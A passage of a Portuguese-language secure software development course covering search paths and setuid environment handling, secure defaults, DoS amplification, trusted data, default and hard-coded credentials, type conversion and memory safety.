class=task-list-control><input disabled type=checkbox><span class=task-list-indicator></span></label> Ao criar ou alterar uma senha, peça ao usuário para inserir a senha antiga. Isso evita que um invasor altere a senha facilmente se tiver controle breve da conta. Além disso, peça ao usuário para inserir a nova senha duas vezes e verifique se são as mesmas, para garantir que a senha pretendida seja usada como senha. Isso também verifica se um gerenciador de senhas (se houver) está enviando a senha de forma consistente.</li> </ul> <p>Quando um usuário altera uma senha ou outra credencial (como tokens MFA), considere notificá-lo (por exemplo, enviando um e-mail ou mensagem de texto). Dessa forma, se o usuário não tiver causado a alteração, ele será alertado imediatamente.</p> <h1 id=caminhos-de-pesquisa-e-variaveis-de-ambiente-incluindo-programas-setuidsetgid>Caminhos de pesquisa e variáveis ​​de ambiente (incluindo programas setuid/setgid)<a class=headerlink href=#caminhos-de-pesquisa-e-variaveis-de-ambiente-incluindo-programas-setuidsetgid title="Permanent link">¶</a></h1> <p>Os aplicativos frequentemente precisam buscar outros recursos, como bibliotecas, comandos e pacotes. Em muitos casos, essa busca é controlada por um "caminho de busca" — um local ou sequência de locais a serem pesquisados.</p> <p>Um exemplo de caminho de busca é a variável de ambiente <strong>PATH</strong> , que lista uma sequência de diretórios e é usada na busca por executáveis ​​em sistemas Unix e Windows. Existem muitas outras variáveis ​​de ambiente do tipo <strong>PATH (por exemplo,</strong> <strong>PYTHONPATH</strong> em Python).</p> <p>Além disso, muitos outros sistemas possuem caminhos de busca; por exemplo, gerenciadores de pacotes geralmente oferecem suporte a um caminho de busca que indica os repositórios ou registros de onde os pacotes podem ser recuperados.</p> <p>Se um invasor puder controlar o caminho de busca, ele poderá frequentemente fazer com que o aplicativo execute código malicioso, use dados controlados por ele ou revele dados privados. Por exemplo, se um invasor puder controlar a variável de ambiente <strong>PATH</strong> , poderá forçar o aplicativo a executar programas indesejados. A melhor solução é garantir que o invasor não possa controlar o caminho de busca, por exemplo, não fornecendo a oportunidade ou definindo o caminho de busca com um valor seguro antes de usá-lo.</p> <p>Um problema relacionado é que o caminho de busca pode conter um local que um invasor pode controlar ou influenciar de forma imprevista. Por exemplo, se a variável de ambiente <strong>PATH</strong> tiver uma entrada definida para o diretório atual, ou seja, " <strong>.</strong> " ou "" (em branco), e a entrada estiver listada antes de diretórios mais confiáveis, o diretório atual será usado primeiro. Isso pode se tornar uma vulnerabilidade, pois o invasor pode eventualmente inserir conteúdo em um diretório que o aplicativo usará como diretório atual. Em sistemas antigos do tipo Unix, essa configuração insegura <strong>de PATH</strong> era o padrão.</p> <p>Uma maneira comum de esse erro ocorrer hoje é se o caminho for modificado pela concatenação do separador de diretório e, em seguida, do novo diretório; se o caminho estava vazio para começar, isso adiciona uma entrada em branco como a primeira entrada. Por exemplo, se <strong>PYTHONPATH</strong> estivesse vazio, concatenar ingenuamente " <strong>:</strong> " e o diretório <strong>/usr/share/foo</strong> produziria o <strong>PYTHONPATH</strong> " <strong>:/usr/share/foo</strong> ";</p> <p>Observe que o diretório vazio é listado primeiro, o que seria interpretado como a busca sendo feita primeiro no diretório atual. A solução neste caso é inserir o separador apenas se já houver texto nele.</p> <p>Existem várias contramedidas potenciais para problemas no caminho de pesquisa, por exemplo:</p> <ul class=task-list> <li class=task-list-item><label class=task-list-control><input disabled type=checkbox><span class=task-list-indicator></span></label> Ao iniciar, examine o caminho de pesquisa que você usará (como <strong>PATH</strong> ) em busca de erros comuns, como incluir um diretório em branco ou " <strong>.</strong> " antes de caminhos mais confiáveis ​​(como <strong>/usr/bin</strong> ). Em sistemas Windows, verifique se o modo de pesquisa segura de DLL está habilitado. Você pode interromper, ou pelo menos avisar, se as configurações atuais do sistema forem perigosas.</li> <li class=task-list-item><label class=task-list-control><input disabled type=checkbox><span class=task-list-indicator></span></label> Use nomes de caminho completos ao fazer uma solicitação (por exemplo, ao chamar programas executáveis, importar bibliotecas ou solicitar pacotes). A maioria dos sistemas que suportam um caminho de busca também permite a solicitação direta do componente específico; fazer uma solicitação direta garantirá que você esteja solicitando os componentes corretos. Este é um mecanismo de proteção plausível, mas é fácil esquecer de fazê-lo em alguns casos, e isso às vezes dificulta a portabilidade de software entre sistemas.</li> </ul> <p>Muitos valores de configuração, incluindo diversos caminhos de pesquisa, são fornecidos por meio de variáveis ​​de ambiente. Alguns ambientes de execução, como JavaScript do lado do cliente, não possuem variáveis ​​de ambiente. Na maioria dos outros ambientes (cliente e servidor), variáveis ​​de ambiente existem, mas normalmente são consideradas confiáveis ​​(ou seja, variáveis ​​de ambiente só podem ser definidas por alguém com autorização para defini-las).</p> <p>Alguns sistemas operacionais históricos tinham configurações inseguras de variáveis ​​de ambiente. Um dos casos mais comuns é que sistemas operacionais antigos tinham uma variável de ambiente <strong>PATH insegura, de modo que o diretório atual "</strong> <strong>.</strong> " era pesquisado em busca de executáveis ​​antes de diretórios mais confiáveis. Da mesma forma, alguns usuários ingênuos configuravam suas variáveis <strong>​​PATH</strong> com valores inseguros, embora, felizmente, esse tipo de erro seja menos comum hoje em dia. Também é muito específico do ambiente; em muitos ambientes, um invasor não consegue controlar o conteúdo de nenhum dos locais.</p> <p>No entanto, há outro caso especial importante: se você estiver escrevendo algo chamado programa <strong>setuid</strong> ou <strong>setgid</strong> , as <em>variáveis ​​de ambiente podem frequentemente vir de um invasor</em>. Uma pequena introdução provavelmente é necessária. Sistemas do tipo Unix (incluindo Linux e macOS) permitem que programas sejam <strong>setuid</strong> e/ou <strong>setgid</strong>.</p> <p>Quando um programa <strong>setuid</strong> é executado, ele tem os privilégios de seu <em>proprietário</em> (não de seu solicitante). Um programa <strong>setgid</strong> é executado com os privilégios de seu <em>grupo</em> (não os grupos de seu solicitante). Esses tipos de programas herdam muitas entradas de um invasor em potencial, incluindo o valor do diretório atual e as variáveis ​​de ambiente. Uma solução é não escrever um programa <strong>setuid</strong> ou <strong>setgid</strong> , pois em muitos casos essa abordagem não é necessária hoje.</p> <p>Se você <em>escrever</em> um programa <strong>setuid/setgid</strong> , seu programa deve se proteger de todas as suas entradas, e isso inclui o diretório atual e as variáveis ​​de ambiente. Variáveis ​​de ambiente podem ser especialmente complicadas, pois há muitas abordagens inseguras que parecem seguras. Isso ocorre porque as variáveis ​​de ambiente geralmente são de fontes confiáveis, então a maioria dos desenvolvedores não está preparada para lidar com o caso incomum em que as variáveis ​​de ambiente <em>não</em> são de fontes confiáveis.</p> <p>A única solução segura é (como parte da inicialização) extrair <em>apenas</em> as variáveis ​​de ambiente necessárias, garantir que seus valores sejam seguros, apagar <em>todas</em> as variáveis ​​de ambiente e redefinir as variáveis ​​necessárias para valores seguros (incluindo valores seguros fornecidos na inicialização do programa). Apagar todas as variáveis ​​de ambiente na maioria das linguagens de programação é fácil, basta definir a variável global <strong>environ</strong> para um ponteiro nulo ou seu equivalente ( <a href=https://pubs.opengroup.org/onlinepubs/9699919799/functions/environ.html>a variável <strong>environ</strong> é definida no padrão POSIX</a> ).</p> <p>Faça isso <em>cedo</em> , antes de criar qualquer thread.</p> <p>Você não pode simplesmente remover algumas variáveis ​​de ambiente;</p> <p>Um invasor pode criar uma estrutura de dados de variáveis ​​de ambiente bizarra, e há simplesmente muitas variáveis ​​de ambiente potencialmente perigosas (como <strong>LD_LIBRARY_PATH</strong> ) para tentar apagar apenas certos valores perigosos.</p> <p>Este é mais um exemplo de lista de permissões em vez de lista de proibições: permita apenas as poucas variáveis ​​de ambiente necessárias, com seus valores permitidos, e nada mais. Em vez disso, certifique-se de que as únicas variáveis ​​possíveis sejam aquelas que você espera e para as quais tenham valores seguros. Isso inclui <strong>PATH</strong> e todas as outras variáveis ​​de ambiente.</p> <h2 id=entradas-especiais-padroes-seguros-e-inicializacao-segura>Entradas especiais: Padrões seguros e inicialização segura<a class=headerlink href=#entradas-especiais-padroes-seguros-e-inicializacao-segura title="Permanent link">¶</a></h2> <p>Há um conjunto especial de entradas frequentemente usado na inicialização: informações de configuração. Isso pode ser crítico para a segurança.</p> <p>Os sistemas modernos possuem muitos componentes. O software que você desenvolver provavelmente será uma pequena parte de algum outro sistema muito maior. Não espere que as pessoas leiam atentamente sua documentação; elas não lerão.</p> <p>Em vez disso, facilite <em>o</em> uso seguro do seu software.</p> <p>Primeiro, certifique-se de que seu software seja <em>seguro por padrão</em>. Se não houver informações de configuração, seu programa deve executar o que for considerado seguro (que geralmente é negar acesso). Se houver configurações de exemplo ou código de exemplo mostrando como usá-lo, certifique-se de que os exemplos também sejam seguros (as pessoas normalmente copiam e colam exemplos ao usar algo).</p> <p>Não crie configurações de exemplo que <em>permitam acesso a todos,</em> a menos que esse seja um uso normal. Em vez disso, crie exemplos o mais restritivos possível. Inclua muitos comentários claros no arquivo de configuração de exemplo, se houver, para que o administrador entenda o que a configuração faz.</p> <p>Se os exemplos de segurança forem muito complicados ou difíceis de explicar, isso sugere que sua configuração ou API é muito complexa ou tem os padrões errados. Não corrija apenas a documentação, corrija o código para que seja mais fácil de configurar ou usar com segurança, e assim a documentação será mais fácil de criar.</p> <p>Obtenha informações de configuração (especialmente se contiverem código) de uma fonte confiável – não de um usuário não confiável. Se você estiver criando um aplicativo desktop tradicional, não há problema em obter a configuração do diretório inicial ou de um diretório de configuração dentro dele, como <strong>$HOME/.config</strong> , mas tome cuidado com configurações ou quaisquer outros dados do diretório atual; o usuário pode ter dados descompactados de um invasor no diretório atual. Aplicativos web do lado do servidor devem baixar configurações e código apenas de fontes confiáveis ​​(por exemplo, seus diretórios locais). Aplicativos web do lado do cliente devem usar a Política de Segurança de Conteúdo (CSP) para limitar onde podem obter informações, como discutiremos mais adiante.</p> <p>Ao iniciar, ou mesmo periodicamente, considere verificar se suas premissas de segurança são válidas e interrompa o processo caso não sejam. Por exemplo, se você tiver acesso a alguns arquivos privados, certifique-se de que eles não sejam legíveis por grupos ou por todos. Se for um aplicativo web, verifique se <strong>https</strong> (TLS) está sendo usado. Algumas verificações não valem a pena (porque são muito difíceis de fazer), mas mesmo algumas verificações de integridade podem detectar e prevenir alguns problemas.</p> <p>Às vezes, os usuários podem precisar desabilitar alguma medida de segurança. Sempre que possível, faça disso um caso excepcional; os usuários normalmente não precisam fazer isso. Se precisarem, certifique-se de que os usuários <em><strong>saibam</strong></em> que estão desabilitando algo importante e quais são as consequências. No mínimo, documente que é perigoso e o porquê. Nesses casos, pode ser sensato relatar ou pelo menos registrar na inicialização qual medida de segurança foi desabilitada, observar que isso é perigoso e como reabilitá-la.</p> <p>A maioria dos sistemas maiores precisa de algum mecanismo para receber informações de configuração. Certifique-se de que você pode confiar na fonte, se for o caso. Por exemplo, programas <strong>setuid</strong> recebem variáveis ​​de ambiente de um adversário em potencial; esses programas precisam validar as variáveis ​​de ambiente que permitirão, extraí-las, apagar todas as variáveis ​​de ambiente e, em seguida, redefinir apenas os valores para aqueles em que podem confiar.</p> <p>Alguns sistemas tentam depender de <em>inicialização segura</em> ou mecanismos semelhantes para garantir que apenas softwares específicos sejam executados em um computador específico. Não leve esses mecanismos muito a sério se o computador (como um smartphone) puder ser controlado fisicamente por um invasor em potencial. Se um invasor tiver controle físico sobre um dispositivo, esse invasor terá o controle final sobre o dispositivo. A realidade é que os sistemas de inicialização segura foram quebrados repetidamente; confiar que isso nunca acontecerá no futuro é ignorar as lições do passado. É melhor projetar seu sistema de forma que você não precise confiar no aplicativo naquele dispositivo, mas, em vez disso, execute o software em que precisa confiar em hardware controlado por alguém em quem você confia. Os sistemas de inicialização segura são muito mais poderosos se o sistema for controlado fisicamente por uma parte confiável, porque então eles estão simplesmente fornecendo uma medida de proteção adicional para quem está fisicamente no controle.</p> <h2 id=considere-a-disponibilidade-em-todas-as-entradas-introducao>Considere a disponibilidade em todas as entradas: Introdução<a class=headerlink href=#considere-a-disponibilidade-em-todas-as-entradas-introducao title="Permanent link">¶</a></h2> <p>Como discutimos anteriormente, muitas vezes é difícil garantir a disponibilidade em todas as circunstâncias possíveis. Por exemplo, se um sistema for acessível publicamente pela internet, um invasor poderá iniciar um ataque de Negação de Serviço (DDoS) distribuído em larga escala, sobrecarregando os recursos do seu serviço.</p> <p>Mas quando você começa a considerar a disponibilidade como um problema de gerenciamento de riscos, as coisas não são tão terríveis. Você quer reduzir o risco de ataques DoS, ou seja, reduzir sua probabilidade ou impacto. Você pode reduzir a probabilidade tornando o ataque mais difícil, arriscado ou exigindo mais recursos do invasor.</p> <h2 id=tente-eliminar-entradas-facilmente-amplificadas>Tente eliminar entradas facilmente amplificadas<a class=headerlink href=#tente-eliminar-entradas-facilmente-amplificadas title="Permanent link">¶</a></h2> <p>Um conceito útil é a ideia de alavancagem. _"No contexto de um ataque DoS, se uma vulnerabilidade tem alta alavancagem, isso significa que os invasores podem consumir uma tonelada de recursos do seu servidor com recursos mínimos... quanto maior a alavancagem, maior o risco e maior a probabilidade de eu abordar o problema diretamente.</p> <p>Quanto menor a alavancagem, maior a probabilidade de eu aceitar o risco e/ou recorrer a [outras] mitigações."_ ( <em><a href=https://r2c.dev/blog/2020/understanding-and-preventing-dos-in-web-apps/ >Nem todos os ataques são iguais: entendendo e prevenindo DoS em aplicações web</a></em> , por Jacob Kaplan-Moss, 2020)</p> <p>Considere cada tipo de entrada que seu software recebe. Existe alguma maneira de um invasor enviar uma quantidade muito pequena de entrada e consumir uma grande quantidade de recursos (por exemplo, computação e/ou saída)? Esses recursos costumam representar um risco maior para a disponibilidade, pois são facilmente amplificados.</p> <p>Aqui estão alguns exemplos de recursos que uma entrada pode consumir desproporcionalmente:</p> <ul> <li>Largura de banda da rede — por exemplo, uma entrada pode produzir uma saída desproporcionalmente grande.</li> <li>Utilização da CPU — por exemplo, uma entrada pode causar grandes quantidades de computação; vimos um exemplo disso anteriormente no ReDoS.</li> <li>Espaço de armazenamento — por exemplo, um arquivo compactado pode se expandir para preencher o espaço de armazenamento.</li> <li>Limites de simultaneidade — por exemplo, uma entrada pode fazer com que um thread/processo seja executado lentamente, fazendo com que o software atinja os máximos de simultaneidade (por exemplo, o número de threads, processos ou conexões de banco de dados).</li> </ul> <p>Os riscos podem ser reduzidos por meio da autenticação, já que os invasores precisam expor algumas informações sobre si mesmos. Em geral, tente eliminar pelo menos os não autenticados e considere exigir algum tipo de autenticação para os demais ( <em><a href=https://r2c.dev/blog/2020/understanding-and-preventing-dos-in-web-apps/ >Nem todos os ataques são iguais: entendendo e prevenindo DoS em aplicações web</a></em> , por Jacob Kaplan-Moss, 2020).</p> <p>Uma solução parcial para reduzir a largura de banda da rede é <em>a paginação</em>. Ou seja, em vez de retornar um resultado muito grande, retornar resultados menores a cada vez. Isso exige que o invasor faça requisições repetidas.</p> <p>Se não for possível eliminar entradas muito amplificadas, tente distribuir a carga. Por exemplo, se você estiver distribuindo arquivos grandes, considere usar uma Rede de Distribuição de Conteúdo (CDN), torrent ou outro sistema semelhante. Muitos sites usam CDNs para que solicitações simples com respostas potencialmente grandes não sobrecarreguem seus servidores.</p> <h2 id=prefira-dados-confiaveis-trate-dados-nao-confiaveis-como-perigosos>Prefira dados confiáveis. Trate dados não confiáveis ​​como perigosos.<a class=headerlink href=#prefira-dados-confiaveis-trate-dados-nao-confiaveis-como-perigosos title="Permanent link">¶</a></h2> <p>Se for importante, certifique-se de processar seus dados usando um ambiente confiável.</p> <p>Assim como na validação de entrada, se você se importa com a resposta após o processamento dos dados, precisa processá-los em um sistema confiável. Se você processa dados usando um script em um navegador da web ou aplicativo móvel e esse navegador da web ou aplicativo móvel pode ser controlado por um invasor, você não pode confiar em nada do que ele faz; todos esses dados ficarão visíveis para o invasor, que pode forçar resultados diferentes. Se os invasores só podem atacar a si mesmos, isso não é um problema, mas certifique-se de que se limite a isso. Se um sistema não confiável processa alguns dados e envia o resultado para você, você precisa tratá-lo como dados não confiáveis.</p> <p>Isso nos leva a uma regra prática útil: <em>sempre que tiver uma escolha, tente usar os dados mais confiáveis</em>.</p> <p>Um exemplo pode ajudar. Muitos sistemas, quando recebem uma solicitação de redefinição de senha, enviam um e-mail para confirmar a redefinição. Antigamente, o GitHub pedia o endereço de e-mail de um usuário não confiável. Se esse endereço correspondesse a um endereço de e-mail no banco de dados, ignorando as distinções entre maiúsculas e minúsculas usando as regras do inglês, o GitHub enviava a redefinição de senha para o endereço de e-mail <em>fornecido pelo invasor</em>. Essa foi uma péssima ideia. Os padrões de e-mail não garantem que a parte local do endereço de e-mail (a parte antes do símbolo <strong>@</strong> ) não diferencie maiúsculas de minúsculas (consulte <a href=https://tools.ietf.org/html/rfc5321#section-2.3.11>a seção 2.3.11 do IETF RFC 5321</a> ). Ao converter o endereço de e-mail para minúsculas, não há garantia de que a redefinição seja enviada para o endereço de e-mail correto. Muitos sistemas de e-mail ignoram as distinções entre maiúsculas e minúsculas, mas podem não usar o inglês! Em alguns sistemas de e-mail turcos, a parte local do endereço de e-mail seria normalizada para uma conta de e-mail <em>diferente</em> da conta original. Por exemplo, <strong><a href=mailto:MIKE@example.org>MIKE@example.org</a></strong> seria normalizado para <strong><a href=mailto:mıke@example.org>mıke@example.org</a></strong> (usando um i sem ponto), que seria uma conta de e-mail diferente de <strong><a href=mailto:mike@example.org>mike@example.org</a></strong> (que usa um i com ponto). Isso levou a uma vulnerabilidade explorável (GitHub Security, <em><a href=https://bounty.github.com/researchers/jagracey.html>E-mails de redefinição de senha entregues em endereço errado</a></em> , 2016).</p> <p>Este ataque parece sutil, mas é uma clara violação da nossa regra básica: se você tiver dados mais confiáveis ​​disponíveis, tente usá - <em>los</em> ! Por exemplo, se você tiver uma solicitação de redefinição de senha e quiser enviar um e-mail para confirmar que o usuário originalmente confirmado a autorizou, envie o e-mail de redefinição exatamente para o endereço de e-mail <em>já confirmado</em> em seu banco de dados. Você já confirmou que esse é o endereço de e-mail correto, portanto, pode confiar mais nele. Esta regra simples – <em>tente usar os dados mais confiáveis</em> ​​– evitará muitos ataques sutis sem que você perceba.</p> <p>No entanto, muitas aplicações precisam processar dados não confiáveis. Nesse caso, ao processar dados não confiáveis, trate-os como <strong><em>radioativos</em></strong> — ou seja, tenha cuidado ao processá-los de qualquer forma, lembrando-se de que podem ser de um invasor. Há muitas maneiras de ter cuidado, como discutiremos.</p> <h2 id=evite-credenciais-padrao-e-codificadas>Evite credenciais padrão e codificadas<a class=headerlink href=#evite-credenciais-padrao-e-codificadas title="Permanent link">¶</a></h2> <p>Muitos programas precisam usar alguma informação secreta. Um tipo especialmente comum de segredo é uma <em>credencial</em> (por exemplo, uma senha ou chave secreta). A forma como você as protege depende de como são usadas, e há dois usos comuns para credenciais:</p> <ul> <li><strong>Entrada</strong> O software recebe algumas credenciais como entradas e verifica se elas correspondem para autenticar outra coisa.</li> <li><strong>Saída</strong> O software envia as credenciais para outra coisa para se autenticar em outra coisa.</li> </ul> <h1 id=evite-credenciais-padrao>Evite credenciais padrão<a class=headerlink href=#evite-credenciais-padrao title="Permanent link">¶</a></h1> <p>Softwares nunca devem ser entregues com credenciais padrão. Existem inúmeras páginas da web que rastreiam credenciais padrão, como <strong>admin/admin</strong>. Assim que alguém encontrar as credenciais, provavelmente acabará nessas listas. Isso permitirá que invasores invadam seu software (se for uma credencial de entrada) ou o software de terceiros (se for uma credencial de saída). Se o software tiver muitas instalações, todas elas poderão estar vulneráveis ​​ao mesmo tempo. <strong>Lembre-se:</strong> os usuários geralmente aceitam o que for o padrão e, se o padrão for inseguro, o software será inseguro. Ofuscar o código não é suficiente; muitos invasores são bastante habilidosos em extrair e analisar executáveis.</p> <p>A solução usual para isso é ter um modo de "primeiro login" que detecta que ainda não há uma credencial (senha ou chave) e, em seguida, permite que o usuário crie uma única. Isso pressupõe que ela precise ser armazenada; em alguns casos, você pode simplesmente pedir ao usuário que a forneça a cada vez.</p> <h2 id=evite-credenciais-codificadas-em-vez-disso-armazene-as-com-seguranca>Evite credenciais codificadas. Em vez disso, armazene-as com segurança.<a class=headerlink href=#evite-credenciais-codificadas-em-vez-disso-armazene-as-com-seguranca title="Permanent link">¶</a></h2> <p>Credenciais codificadas são credenciais armazenadas no código-fonte, código compilado ou qualquer outro local que não pode ser alterado rapidamente por alguém autorizado a fazê-lo.</p> <p>Credenciais codificadas são erros. As credenciais devem ser alteradas sempre que o software for instalado pela primeira vez para uso e devem ser fáceis e rápidas de alterar. Armazenar credenciais no código-fonte é uma ideia particularmente ruim. O código-fonte normalmente é gerenciado por sistemas de controle de versão, portanto, quaisquer credenciais no código ficarão disponíveis para qualquer pessoa com acesso a ele... e isso geralmente envolve muito mais pessoas do que o necessário. Codificar essas informações de uma forma que possa ser desfeita (por exemplo, usando Base64 ou ROT13) não ajuda.</p> <p>Portanto: não codifique credenciais (por exemplo, dentro do código-fonte ou código compilado). Em vez disso, armazene as credenciais separadamente, de forma que sejam fáceis de alterar. Certificados de chave pública geralmente não precisam ser mantidos em segredo, mas podem precisar ser atualizados. Outras credenciais geralmente precisam ser mantidas em segredo e devem ser protegidas pelo menos o necessário. Como discutiremos brevemente mais adiante, existem ferramentas que podem ajudar a identificar credenciais codificadas no código-fonte.</p> <p>Para autenticação de entrada usando senhas, armazene as credenciais separadamente e use um algoritmo seguro projetado especificamente para codificá-las. Discutiremos isso com mais detalhes na seção sobre Criptografia na <strong>Parte 3</strong> do curso, mas, por enquanto, saiba apenas que você precisa usar um algoritmo <em>de hash criptográfico com salt iterativo por usuário,</em> como o Argon2id.</p> <p>Para autenticação de saída, as credenciais devem ser armazenadas fora do código, em um sistema de armazenamento protegido contra todos os invasores (incluindo usuários locais no mesmo sistema/host de nuvem). Idealmente, todas as credenciais seriam armazenadas em um arquivo ou banco de dados criptografado, mas em muitos ambientes isso é difícil de fazer (onde você armazena a chave para acessá-la?). No mínimo, armazene as credenciais em algo como um arquivo ou tabela de banco de dados com permissões tão restritivas quanto possível. Variáveis ​​de ambiente geralmente são uma maneira mais fraca de armazenar credenciais, já que seus valores estão disponíveis para todo o processo que as carrega, mas em algumas circunstâncias, isso é aceitável... e geralmente é muito melhor do que codificar credenciais.</p> <h2 id=evite-conversao-ou-conversao-incorreta>Evite conversão ou conversão incorreta<a class=headerlink href=#evite-conversao-ou-conversao-incorreta title="Permanent link">¶</a></h2> <p>Quase todas as linguagens de programação suportam múltiplos tipos de dados, como inteiros, ponto flutuante, caracteres e strings. A maioria das linguagens de programação possui pelo menos alguma verificação de tipos incorporada; os tipos podem ser verificados estaticamente (antes do tempo de execução) e/ou dinamicamente (em tempo de execução). Essas verificações podem, às vezes, alertar ou evitar problemas sérios.</p> <p>Às vezes, é necessário converter ou converter um valor de dados de um tipo para outro. Os detalhes dependem da linguagem de programação, mas, embora seja necessário, conversões e conversões incorretas acabam causando um número desproporcional de vulnerabilidades. A conversão pode causar perda de informações ou levar a um novo valor que pode ter sido completamente inesperado. Qualquer conversão ou conversão, especialmente aquelas que podem causar perda de informações, deve ser revisada para considerar se há algum risco em fazê-lo. Algumas linguagens têm um qualificador <strong>const</strong> para declarar constantes; é perigoso descartar um qualificador <strong>const</strong> , pois isso permite alterações no valor, enquanto outras partes do sistema podem depender de sua constante.</p> <p>Um caso especial, que pode ocorrer em algumas linguagens de programação, é chamado de "confusão de tipos". A confusão de tipos ocorre quando o acesso a um recurso é feito usando um tipo incompatível com seu tipo original. Isso pode ser considerado uma conversão incorreta silenciosa. Isso é facilmente feito em linguagens como C e C++ usando tipos de união, onde a mesma região de memória pode ser expressamente definida como permitindo múltiplos tipos. Ao usar tipos de união, o desenvolvedor <em>deve</em> garantir que apenas o tipo correto seja usado para um determinado acesso (leitura ou escrita).</p> <p>No entanto, a confusão de tipos não se limita a C e C++. A confusão de tipos pode ocorrer em qualquer linguagem onde a mesma variável ou local de memória possa ser interpretado de mais de uma maneira. Conforme observado pelo MITRE para <a href=https://cwe.mitre.org/data/definitions/843.html>o CWE-843</a> , "erros em aplicações PHP podem ser acionados pelo fornecimento de parâmetros de array quando escalares são esperados, ou vice-versa. Linguagens como Perl, que realizam a conversão automática de uma variável de um tipo quando ela é acessada como se fosse de outro tipo, também podem apresentar esses problemas."</p> <p>Para nossos propósitos, conversões não incluem determinar se um valor é verdadeiro. Em geral, linguagens de programação têm construções condicionais (como <strong>if</strong> e <strong>while)</strong> que produzirão resultados diferentes dependendo se o valor de uma condição é verdadeiro ou não. O que é verdadeiro é uma decisão de design fundamental ao criar uma linguagem de programação. Por exemplo, todo valor em JavaScript é considerado verdadeiro, exceto por uma lista específica de valores falsos (atualmente <strong>false</strong> , <strong>0</strong> , <strong>-0</strong> , <strong>0n</strong> , <strong>""</strong> , <strong>null</strong> , <strong>undefined</strong> e <strong>NaN</strong> ). Em tais linguagens, <strong>if p</strong> e similares são uma abreviação para verificar se um valor é verdadeiro. Essa interpretação em condicionais pode ser considerada uma conversão de algum outro tipo para um tipo booleano, mas tais construções são, na verdade, apenas uma maneira abreviada de determinar se um valor é verdadeiro, e não é disso que estamos falando aqui.</p> <h2 id=seguranca-da-memoria>Segurança da Memória<a class=headerlink href=#seguranca-da-memoria title="Permanent link">¶</a></h2> <p>Infelizmente, lidar com dados não confiáveis ​​pode ser <em>especialmente</em> difícil em algumas linguagens de programação ou quando certos modos de linguagem de programação estão habilitados. A maioria das linguagens de programação impede automaticamente qualquer tentativa de leitura ou gravação em áreas de memória não alocadas. Essas são chamadas de <em>linguagens de segurança de memória</em>. No entanto, os mecanismos de segurança de memória geralmente apresentam uma sobrecarga de desempenho.</p> <p>Como resultado, algumas linguagens de programação que enfatizam o desempenho <em>não</em> são seguras para a memória ou possuem uma maneira de desabilitá-las. As linguagens de programação amplamente utilizadas, C e C++, <em>não</em> são seguras para a memória. Existem também algumas linguagens que enfatizam o desempenho e que <em>normalmente</em> são seguras para a memória, mas possuem uma maneira de desabilitar as verificações de segurança para permitir um desempenho adequado; entre elas, estão Rust (ao usar código inseguro), C# (ao usar código inseguro) e Ada (ao usar pragma suppress para suprimir as verificações de segurança da memória).</p> <p>Problemas de segurança de memória são uma causa comum de vulnerabilidades. O estudo de Catalin Cimpanu, <em><a href=https://www.zdnet.com/article/microsoft-70-percent-of-all-security-bugs-are-memory-safety-issues/ >"Microsoft: 70% de todos os bugs de segurança são problemas de segurança de memória"</a></em> (2019), constatou que cerca de 70% de todas as vulnerabilidades da Microsoft entre 2006 e 2018 foram causadas por problemas de segurança de memória. Além disso, embora haja flutuações anuais, o índice tem se mantido relativamente estável ao longo desse período:</p> <p><a class=glightbox data-desc-position=bottom data-height=auto data-type=image data-width=80% href=https://d36ai2hkxl16us.cloudfront.net/course-uploads/e0df7fbf-a057-42af-8a1f-590912be5460/dfjax4d37eus-image.png><img alt="Porcentagem de vulnerabilidades de segurança de memória na Microsoft" src=https://d36ai2hkxl16us.cloudfront.net/course-uploads/e0df7fbf-a057-42af-8a1f-590912be5460/dfjax4d37eus-image.png></a></p> <p><strong>Porcentagem de vulnerabilidades de segurança de memória na Microsoft</strong>  (por Catalin Cimpanu, obtido do <a href=https://www.zdnet.com/article/microsoft-70-percent-of-all-security-bugs-are-memory-safety-issues/ >ZDNet</a> )</p> <p>Segurança de memória é um subconjunto de uma categoria maior chamada <em>comportamento indefinido</em> , onde o sistema não garante nada — e comportamento indefinido frequentemente leva a vulnerabilidades de segurança. Discutiremos isso mais adiante, mas observaremos brevemente que C e C++ têm um número notavelmente grande de comportamentos indefinidos, tornando especialmente difícil escrever software seguro nessas linguagens.</p> <p>Você pode ter esses problemas <em>mesmo se</em> escrever código em uma linguagem que seja segura para a memória e não tenha comportamentos indefinidos. Seu código pode chamar <em>outro</em> código com comportamento indefinido, o que leva a vulnerabilidades. Como quase todo programa acaba chamando pelo menos algum código escrito em C ou C++, isso significa que pelo menos algumas partes do seu programa podem ser indiretamente vulneráveis, mesmo que ele não seja escrito em C ou C++.</p> <p>Um dos truques mais conhecidos de invasores são leituras e gravações fora dos limites (incluindo <em>estouros de buffer</em> ) — portanto, falaremos brevemente sobre o que é isso e como combatê-lo. Em seguida, discutiremos outro tipo de falha que frequentemente leva a vulnerabilidades de segurança: as liberações duplas. Por fim, discutiremos a categoria mais ampla de comportamentos indefinidos.</p> <h2 id=leiturasgravacoes-fora-dos-limites-e-estouro-de-buffer-i>Leituras/gravações fora dos limites e estouro de buffer I<a class=headerlink href=#leiturasgravacoes-fora-dos-limites-e-estouro-de-buffer-i title="Permanent link">¶</a></h2> <p>Um dos tipos mais comuns de vulnerabilidades de segurança ocorre quando uma leitura ou gravação está <em>"fora dos limites"</em> dentro de um código inseguro para a memória. Essas vulnerabilidades são comuns e os invasores as consideram fáceis de explorar. Esse problema é conhecido há muito tempo; Aleph One (Elias Levy) descreve em detalhes em " <em><a href=http://phrack.org/issues/49/14.html#article>Smashing the Stack for Fun and Profit"</a></em> (1996) como explorar essas vulnerabilidades.</p> <p><strong>Nota:</strong> Leituras e gravações fora dos limites são tão comuns e perigosas que na lista CWE Top 25 de 2021, a fraqueza nº 1 envolve gravações ( <a href=https://cwe.mitre.org/data/definitions/787.html>CWE-787</a> , <em>Gravação fora dos limites</em> ), a fraqueza nº 3 envolve leituras ( <a href=https://cwe.mitre.org/data/definitions/125.html>CWE-125</a> , <em>Leitura fora dos limites</em> ), e o problema geral é o nº 17 ( <a href=https://cwe.mitre.org/data/definitions/119.html>CWE-119</a> , <em>Restrição imprópria de operações dentro dos limites de um buffer de memória</em> ). Na lista CWE Top 25 de 2019, o problema geral é a fraqueza nº 1 ( <a href=https://cwe.mitre.org/data/definitions/119.html>CWE-119</a> <em>Restrição imprópria de operações dentro dos limites de um buffer de memória</em> ), e casos específicos dela são o nº 5 ( <a href=https://cwe.mitre.org/data/definitions/125.html>CWE-125</a> <em>Leitura fora dos limites</em> ) e o nº 12 ( <a href=https://cwe.mitre.org/data/definitions/787.html>CWE-787</a> <em>Gravação fora dos limites</em> ).</p> <p>Aqui estão os fundamentos. Quase todos os programas precisam armazenar resultados intermediários, e essas áreas de 